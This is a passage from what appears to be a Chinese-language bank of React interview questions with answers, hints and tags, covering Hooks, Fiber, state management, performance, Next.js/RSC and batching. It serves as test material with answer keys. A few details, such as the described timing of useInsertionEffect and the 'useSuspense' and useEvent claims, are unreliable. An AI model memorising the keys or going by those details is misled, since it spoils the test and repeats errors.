为持久化模型如 Canvas）。\n\n3) 常见自定义渲染器：\n- React Native：使用 Yoga 引擎将 Flexbox 布局映射到原生 UI 组件（UIView/TextView），事件系统通过 JS Bridge 通信。\n- React Three Fiber（R3F）：将 React 组件映射到 Three.js 场景图对象——createInstance 创建 Mesh/Material 等 Three.js 对象，commitUpdate 更新 position/rotation 等属性。\n- Ink（终端渲染器）：将组件渲染为终端文本输出——createInstance 创建 Text 对象，appendChild 控制终端输出行列。\n\n4) 实现难点：\n- 事件系统：React 在 DOM 中使用合成事件，自定义渲染器需自行实现事件绑定和委托机制——要么映射到宿主事件模型（React Native 通过原生事件），要么完全自定义（R3F 通过 RAF 循环）。\n- 文本节点：某些宿主无「独立文本节点」概念（如 Canvas），需将文本作为属性而非子节点处理。\n- Container 约束：createContainer 的 container 参数必须来自宿主环境（DOM 渲染器接收 HTMLElement，Ink 接收 TerminalStream 等）。\n- 优先级调度：渲染器需配合 React Scheduler 实现帧对齐、时间切片等。\n- 生产环境注册：自定义渲染器必须全局注册（包括 devTools 钩子），否则 devTools 无法连接。","hints":["react-reconciler 的 HostConfig 约 30-40 个方法——取决于 supportsMutation 和 supportsPersistence 的配置。","自定义渲染器最难的部分不是「渲染」而是「事件」——因为 React 的事件委托（event delegation）模型依赖 DOM 的冒泡机制。"],"tags":["React","react-reconciler","架构","自定义渲染器","中间件"],"id":3529},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Hooks 设计与闭包陷阱","content":"请深入分析 React Hooks 的设计原理和常见陷阱。解释：1. useState / useEffect / useRef / useCallback / useMemo 的实现机制；2. 为什么 Hooks 不能放在条件语句或循环中——「Hooks 的调用顺序必须不变」的底层原因（链表结构）；3. 闭包陷阱（Stale Closure）的产生原因——为什么 useEffect 和 useCallback 中拿到的 state 可能是旧的？如何解决？4. React 18 的 useEvent / useInsertionEffect 解决了什么具体问题？","answer":"答案：Hooks 的核心设计思想是「将状态逻辑从类组件中剥离，以函数的形式复用」。Hooks 的规则（不放在条件/循环中）是由其底层数据结构决定的。\n\n解析：1. 各 Hooks 的机制：\n- useState：返回 [状态, setter]。setter 触发组件重新渲染。每个组件实例维护一个「hooks 链表」——每个 hook 在链表中有一个对应的节点。\n- useEffect：接收回调 + 依赖数组。渲染完成后执行回调——不影响浏览器绘制。依赖数组变化时重新执行。返回的清除函数在下一次 effect 运行前执行。\n- useRef：返回一个可变的 { current } 对象。改变 ref 不触发重新渲染。\n- useCallback：缓存函数引用——只有依赖变化时才创建新函数。等价于 useMemo(() => fn, deps)。\n- useMemo：缓存计算结果——只有依赖变化时才重新计算。\n\n2. Hooks 调用顺序不变的底层原因：\nReact 在组件中用 单向链表 存储 hooks 的状态。每个 hook 在链表中的 位置（索引） 是在 第一次渲染 时确定的。后续渲染时，React 按 位置 从链表中取出对应的 hook 状态。\n- 如果调用顺序改变（如放在条件中），React 无法正确匹配位置——它取出的可能就是错误的 hook 状态。\n- 示例：第一次渲染 f1() f2() f3()，条件分支导致第二次渲染 f1() f3()——React 错误地将 f2 的 state 给了 f3。\n- Vue 3 的 Composition API 也用类似的机制（setup 函数内的 ref/computed 调用顺序）。这是基于「执行顺序」的响应式系统的固有约束。\n\n3. 闭包陷阱（Stale Closure）：\n每次渲染都会创建一个独立的作用域（closure）。useEffect / useCallback 内部引用 state 时，引用的是该次渲染时的值——不是最新的。\n- 示例：useEffect(() => { setTimeout(() => setCount(count + 1), 1000) }, []) —— count 永远卡在初始值。\n- 解决方案：\n  a. 添加正确的依赖：useEffect(() => { ... }, [count])。\n  b. 函数式更新：setCount(prev => prev + 1) —— 不需要依赖。\n  c. useRef 保存最新值：ref.current = count（ref 不创建闭包）。\n  d. React 18 的 useEvent（草案中，尚未正式发布）——稳定引用最新 props/state 但不触发重新创建。\n\n4. React 18 的新 Hooks：\n- useInsertionEffect：在 DOM 变更后、Layout Effect 执行前同步运行。专门给 CSS-in-JS 库使用（注入样式规则）。\n- useEvent（草案/实验性）：创建一个始终引用最新 props/state 的稳定回调函数。解决了「传递一个不会变化的回调但又不想加依赖」的问题。","hints":["Hooks 不能放在条件中的根本原因是链表的索引匹配——和「优雅」或「规范」无关，是纯技术约束","闭包陷阱的本质是每次渲染独立作用域——useCallback / useEffect 捕获的是创建时的值"],"tags":["React","Hooks","闭包陷阱","useEffect","性能优化"],"id":3530},{"category":"react","difficulty":"hard","type":"short_answer","title":"React Fiber 架构与并发模式","content":"请详细解释 React Fiber 架构的核心理念。覆盖：1. React 16 Fiber 架构为什么是对 Stack Reconciler 的全面重写——Fiber 节点结构的设计目的；2. 可中断渲染（Time Slicing）的实现原理——工作循环（Work Loop）和优先级调度；3. React 18 的并发特性——useTransition / useDeferredValue 的作用和工作机制；4. Suspense 与流式 SSR——React 18 的 Streaming SSR 架构如何实现首个字节（HTML）的增量发送。","answer":"答案：Fiber 架构的核心理念是将「渲染」从不可中断的同步递归，变为可中断的异步链表遍历。\n\n解析：1. Fiber vs Stack Reconciler：\n- Stack Reconciler（React 15）：递归遍历 Virtual DOM 树——开始后不可中断。一次性完成整棵树的 diff 和提交。如果树很大（几百个组件），主线程会被阻塞几百毫秒——导致掉帧。\n- Fiber（React 16）：用 Fiber 节点（链表结构）替代 Stack。Fiber 节点是一个 JS 对象，包含：type（组件类型）、key、stateNode（真实 DOM 或组件实例）、child / sibling / return（指向子/兄弟/父 Fiber 的指针）。\n- 链表结构的优势：可以「断点续传」——通过 child / sibling / return 指针可以在遍历中间暂停和恢复。不像递归栈——暂停后就丢失了上下文。\n\n2. 可中断渲染：\n- 工作循环（Work Loop）：requestAnimationFrame 或 MessageChannel（小任务）调度 ——> performUnitOfWork（处理一个 Fiber 节点）——> 检查是否超时 ——> 让出主线程。\n- 每个 Fiber 节点的处理过程中，React 定期检查是否有更高优先级的工作（如用户点击事件）。\n- 双缓冲（Double Buffering）：current fiber tree（当前已渲染的树） + workInProgress fiber tree（正在构建的新树）。构建完成 -> 切换 root 指针（commit 阶段）。\n- commit 阶段是同步的（不可中断）——DOM 操作必须一次性完成。\n\n3. React 18 的并发特性：\n- useTransition：将状态更新标记为「低优先级」——让用户输入等高优先级更新先执行。\n  - 示例：搜索框输入时，输入响应优先，搜索结果渲染可以延迟。const [isPending, startTransition] = useTransition(); startTransition(() => setSearchQuery(e.target.value))\n- useDeferredValue：延迟更新 UI 中的非紧急部分。\n  - 示例：让列表渲染延迟不超过 timeout 时间，让输入框保持流畅。\n- 两者的本质：标记「哪些更新是可以打断的、让位给用户交互的」。\n\n4. Suspense + 流式 SSR：\n- 传统 SSR：服务器必须等待所有组件的数据准备好 -> 生成完整 HTML -> 一次性发送。瀑布流问题——一个慢的数据源阻塞整个页面。\n- 流式 SSR（React 18）：使用 pipeToNodeWritable（Node.js）或类似的流式 API。\n  - 发送流程：尽快发送 Suspense 边界外的 HTML（首屏框架）-> 数据准备好后，发送对应 Suspense 边界的 HTML（注入到 stream 中的占位符位置）。\n  - 先发送静态部分（Header、导航栏等），动态部分（数据来自 API）准备好后再流式注入。\n  - 结合 useSuspense：数据加载时显示 fallback（loading spinner），加载完成后替换为真实内容。","hints":["Fiber 的革命性不是新增了功能——而是将渲染从「不可中断的递归」变成了「可中断的遍历」","useTransition 和 useDeferredValue 的区别：useTransition 包装 setState，useDeferredValue 包装值——但底层机制相同"],"tags":["React","Fiber","并发渲染","Suspense","SSR"],"id":3531},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 状态管理与组件架构模式","content":"请系统性地分析 React 应用中的状态管理方案选型。覆盖：1. 状态分类（UI State / Server State / URL State / Form State）及各分类的最佳实践；2. Context API 的局限性——为什么 Context 不适合高频更新的全局状态？Provider 重新渲染时的性能问题如何排查和解决？3. 第三方状态管理库对比——Zustand / Jotai / Redux Toolkit / TanStack Query 的设计哲学差异；4. 组件架构模式——容器-展示模式（Container/Presentational）、高阶组件（HOC）、Render Props、自定义 Hooks 的演进逻辑。","answer":"答案：React 状态管理的核心原则是「状态尽量靠近它所属的组件」——将状态提升到「恰好够用」的层级。\n\n解析：1. 状态分类：\n- UI State（组件内部状态，局部）：useState、useReducer。状态只在一个组件或少数子组件中使用。最佳实践：保持局部，不必全局化。\n- Server State（服务端状态）：TanStack Query / SWR / RTK Query。缓存 + 后台更新 + 乐观更新。不需要放入 Redux。\n- URL State（路由参数）：React Router / Next.js Router。页面级别状态——搜索词、页码、筛选条件。放入 URL 支持分享和前进/后退。\n- Form State（表单状态）：React Hook Form / Formik。受控组件的值管理 + 验证 + 提交。专用库可以避免不必要的重新渲染。\n\n2. Context 的局限性：\n- Provider 更新时，所有消费该 Context 的组件都会重新渲染——即使它们只关心 Context 的一部分。\n- 解决方案：\n  a. 拆分 Context（如 UserContext、ThemeContext 分开，避免一改全改）。\n  b. context 值拆分 + React.memo + useMemo。\n  c. 对高频更新的状态（如鼠标位置、动画帧）——不要用 Context。用 zustand 的状态订阅机制（selector 精确订阅）。\n- 不是所有全局状态都要用 Context：如果只是「父子组件传参」，用 props 就够。\n\n3. 状态管理库对比：\n- Redux Toolkit（RTK，成熟方案）：Immer 的不可变更新、RTK Query 数据获取。适合大型应用、团队协作（严格的结构约束）。反对者认为模板代码较多。\n- Zustand（简洁方案）：基于 Flux 理念但极简（无 action creator / reducer）。通过 selector 精确控制渲染——只订阅组件关心的字段。最适合中小型应用。\n- Jotai / Recoil（原子状态）：类似「原子 + 派生」模型。每个 atom 独立订阅——粒度比 selector 更细。适合复杂的派生数据和依赖图。\n- TanStack Query / SWR（服务端状态）：不是通用的状态管理——专注服务端数据的缓存、失效、后台更新。最佳组合：Zustand（UI 状态）+ TanStack Query（服务端数据）。\n\n4. 组件架构模式演进：\n- Mixin（React.createClass 时代）-> HOC（高阶组件，注入 props）-> Render Props（函数 prop 提供渲染能力）。\n- 三种模式都存在的问题：Wrapper Hell（多层嵌套）、不直观的数据流。\n- Custom Hooks（React 16.8+）——将逻辑提取到函数中，组件直接调用 hook。相较于 HOC / Render Props 更简洁，类型推导更好。没有嵌套。","hints":["将服务端数据放入 Redux 是最常见的错误——数据刷新/缓存/失效逻辑用 TanStack Query 比自己管理好得多","Context 不是状态管理工具——它是依赖注入工具。高频更新用 zustand 或本地 state"],"tags":["React","状态管理","Zustand","Redux","Context"],"id":3532},{"category":"react","difficulty":"medium","type":"short_answer","title":"React 渲染优化与性能调优","content":"请全面分析 React 应用的性能优化策略。覆盖：1. React 的渲染流程（Render 阶段 -> Commit 阶段），为什么组件的 render 函数被执行了但页面没有变化？2. React.memo 和 React.PureComponent 的浅比较原理——什么时候 memo 无效（props 中的对象 / 函数 / children 每次都新建）；3. 列表优化——虚拟滚动（react-window / react-virtuoso）的原理和使用场景；4. React DevTools Profiler 的使用——如何定位不必要的重新渲染？火焰图中的「为什么这个组件重新渲染了？」问题的排查思路。","answer":"答案：React 性能优化的核心是「减少不必要的重新渲染」和「减少渲染过程的计算量」——这两者的手段和排查方式不同。\n\n解析：1. React 渲染流程（渲染 -> 提交）：\n- Render 阶段：调用组件函数（函数组件）或 render 方法（类组件）-> 生成 React Element -> 与上次的 Fiber 树进行 Diff。\n- Commit 阶段：将 Diff 结果应用到真实 DOM。\n- Render 执行了但页面没变：这是 React 的预期行为——React 在 Render 阶段计算虚拟 DOM 差异，发现没有变化时跳过 DOM 更新。这不叫「性能问题」——但如果 render 的计算量很大（复杂组件树），空跑 render 也是浪费。\n\n2. React.memo 的原理和陷阱：\n- React.memo（函数组件的优化方案）对 props 做浅比较（=== 或 Object.is）。如果 props 的引用没有变化，跳过该组件的重新渲染。\n- memo 失效的常见原因：\n  a. 内联对象/数组：<Child config={{ key: value }} />——每次渲染父组件都创建新对象，浅比较永远不等。\n  b. 内联函数：<Child onClick={() => handleClick(id)} />——同理。\n  c. children 是 JSX：<Child><span>...</span></Child>——JSX 每次创建新的 React 元素。\n  d. 解决方案：useMemo（对象/数组）、useCallback（函数）、提取子组件为独立组件。\n- 不是所有组件都需要 memo——只有渲染开销大的组件（复杂子树）才有用。随意添加 memo 反而增加浅比较的开销。\n\n3. 虚拟滚动（Virtual Scrolling）：\n- 长列表 (1000+ 项) 时，渲染所有 DOM 节点会导致页面卡顿。\n- 原理：只渲染视窗内和缓冲区内的元素（如滚动容器高度的 2-3 倍）。滚动时替换可见元素的内容。\n- react-window：固定高度列表（FixedSizeList）和动态高度列表（VariableSizeList）。\n- react-virtuoso：自动测量高度、支持网格和分组、TypeScript 支持更好。\n- 适用场景：不限数量的列表、表格、聊天记录、大文件树。\n\n4. 使用 React DevTools Profiler 排查：\n- 点击「Record」开始记录 -> 执行操作 -> 停止记录 -> 查看火焰图。\n- Flamegraph 中的每个色块 = 一个组件的渲染。颜色深浅 = 渲染耗时。\n- 「Why did this render?」：点击某个组件查看：\n  a. Props changed：检查哪些 props 的引用变化了（devtools 会高亮改变的 props）。\n  b. Hook changed：检查 hooks 依赖是否变化。\n  c. Parent rendered：父组件重新渲染导致该组件也重新渲染——考虑用 memo 隔离。\n- 常见工具：Why Did You Render（WDYR）钩子库——在开发环境的 console 中打印不必要的重新渲染和原因。","hints":["Render 函数执行了但页面没变不是 bug——这是 React 的正常工作方式，但可以通过 memo 避免计算开销","memo 失效的根源是「引用不等」——内联对象/函数/JSX 每次都新建引用"],"tags":["React","性能优化","memo","虚拟滚动","Profiler"],"id":3533},{"category":"react","difficulty":"hard","type":"short_answer","title":"React 服务端渲染与 Next.js","content":"请详细分析 React 服务端渲染（SSR）的演进和 Next.js 的架构设计。覆盖：1. CSR vs SSR vs SSG vs ISR 的适用场景和数据新鲜度差异；2. Next.js 的架构：Pages Router vs App Router（RSC 架构）的核心差异——为什么 App Router 是基元（Server Component + Client Component）体系？3. RSC（React Server Components）的流式序列化协议——Server Component 如何在不发送 JS bundle 给客户端的情况下传输渲染结果；4. Next.js 的数据获取模式——在 RSC 架构中，我们在哪里获取数据更合理？","answer":"答案：Next.js 的 App Router 是一次架构革命——它彻底改变了 React 应用的数据获取和渲染的模型，从「所有组件在客户端渲染」转变为「组件默认在服务器渲染，客户端只负责交互部分」。\n\n解析：1. 渲染模式对比：\n- CSR（Client-Side Rendering）：所有渲染在客户端完成。优点：部署简单、交互丰富。缺点：白屏时间、SEO 差。\n- SSR（Server-Side Rendering, getServerProps）：请求时在服务器渲染 HTML。优点：完整的 HTML 首屏、SEO 好。缺点：服务器压力大、TTFB 慢。\n- SSG（Static Site Generation）：构建时生成静态 HTML。优点：CDN 缓存最快。缺点：包含动态内容的页面不合适。\n- ISR（Incremental Static Regeneration）：SSG + 增量重新生成——页面在部署后还可以更新。按需重建（on-demand revalidation, Next.js 12.1+）。兼顾静态的速度和动态的实时性。\n\n2. Pages Router vs App Router：\n- Pages Router（Next.js 12 之前）：所有组件默认都是客户端组件（CSR/SSR）。数据获取在 getServerSideProps / getStaticProps 中——和组件文件分离。\n- App Router（Next.js 13+，基于 React 18 的 RSC 架构）：\n  - Server Component（默认）：在服务器执行——直接访问数据库、文件系统、后端 API。不产生 JS bundle 开销。不能使用 Hooks。\n  - Client Component（标记 'use client'）：在浏览器执行——可以交互、用 Hooks、处理状态。\n  - 决定性的差异：以前 SSR 是「服务器渲染 -> 发送 HTML + JS bundle -> 客户端 hydrate（水合）」。现在 RSC 是「服务器渲染 Server Components + 发送序列化结果 -> 客户端保留该结果不 hydrate」。\n  - 性能收益：不需要 hydrate 就不需要发送 Server Component 的 JS bundle——大幅减少 JS 体积。\n\n3. RSC 流式序列化协议：\n- RSC 不是 HTML——而是一种序列化格式（wire format，类似 JSON + React Element 的混合），称为 RSC Payload。\n- 格式包含：类型标记（Element 类型）、props（深度有限：只能序列化 JSON 兼容的类型、Date、Map、Set、React Element）、children（嵌套的 Server Component 或 Client Component 占位符）。\n- 流式传输：使用 ReadableStream（Web Streams API）——服务器一边渲染一边发送，客户端一边接收一边渲染（渐进式展示）。\n- Client Component 的部分：在 RSC Payload 中用一个「占位符」（特殊的 reference ID）标记——客户端收到后由 Client Component 渲染。\n\n4. App Router 的数据获取最佳实践：\n- Server Component 中直接获取（推荐）：async function Page() { const data = await db.query(...); return <div>{data}</div> }——不需要 API 路由，省去网络跳转。\n- 共享数据层：在 Server Component 中获取数据 -> 通过 props 传给 Client Component。避免在 Client Component 中再做一次 fetch。\n- 缓存策略：fetch(url, { cache: 'force-cache' | 'no-store', next: { revalidate: 60 } })。\n- 适合 API 路由的场景：需要调用外部 HTTP API、需要认证鉴权、需要 CORS 控制。","hints":["RSC 的核心优势不是「服务器渲染更快」而是「Server Component 不需要 JS bundle——大幅减少客户端需要加载的 JS 量」","App Router 的核心规则是：默认 Server Component（不产生 JS，不能交互），需要交互的地方用 'use client' 包裹"],"tags":["React","Next.js","SSR","RSC","服务器组件"],"id":3534},{"category":"react","difficulty":"medium","type":"true_false","title":"React 的 useState 批量更新","content":"在 React 18 中，多次调用 useState 的 setter 函数会被自动批量合并为一次重新渲染，无论触发场景（事件处理、useEffect、Promise 回调、setTimeout 等）。","answer":"正确\n\n解析：React 18 的自动批处理（Automatic Batching）在所有场景下合并状态更新。\nReact 17 及之前仅在 React 事件处理中自动批处理，Promise/setTimeout/原生事件中每次 setState 触发独立渲染。\nReact 18 的 createRoot（而非 ReactDOM.render）启用自动批处理全局。\n如需要强制同步刷新（不批处理），使用 flushSync()。\n\n示例：\nconst [a, setA] = useState(0);\nconst [b, setB] = useState(0);\nsetTimeout(() => {\n  setA(1); // React 17: 触发渲染\n  setB(2); // React 17: 再次触发渲染（共 2 次）\n}, 100);\nReact 18: 一次渲染（批处理优化）。","hints":["React 18 之前为什么 setTimeout 中不批处理？","flushSync 的作用是什么？"],"tags":["React","批处理","渲染优化","useState"],"id":3540},{"category":"react","difficulty":"medium","type":"fill_in_blank","title":"React Fiber 架构的协调流程","content":"React Fiber 的协调过程分为两个阶段：________ 阶段构建 Fiber 树并标记副作用（可中断）；________ 阶段执行 DOM 变更和生命周期方法（不可中断）。Fiber 的 ________ 字段指向下一个工作单元。","answer":"{\"correct\": [[\"Render\", \"渲染\", \"协调\"], [\"Commit\", \"提交\"], [\"sibling\"]], \"distractors\": [\"Build\", \"Deploy\", \"parent\", \"child\", \"alternate\"]}","hints":["Render 阶段为什么可以中断？","Commit 阶段为什么必须同步执行？"],"tags":["React","Fiber","协调","渲染"],"id":3541}];
